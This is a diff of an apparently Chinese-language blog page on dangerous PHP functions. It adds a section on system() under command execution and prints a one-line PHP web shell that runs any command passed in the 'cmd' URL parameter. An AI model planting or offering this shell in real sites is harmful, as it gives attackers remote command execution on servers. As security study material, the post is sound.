@@ -342,7 +342,11 @@ call_user_func()<br>
 call_user_func_array()<br>
 array_filter()</p>
 <h3>2、命令执行系</h3>
-<h6>今天的博客先写到这里吧QWQ</h6></div>
+<h4>system()</h4>
+<p>漏洞头头，这里放出一句话木马的形式：</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>
+    <span class="pl-en">system</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_GET</span></span>[<span class="pl-s">'<span class="pl-s">cmd</span>'</span>]);
+<span class="pl-ent">?&gt;</span></pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
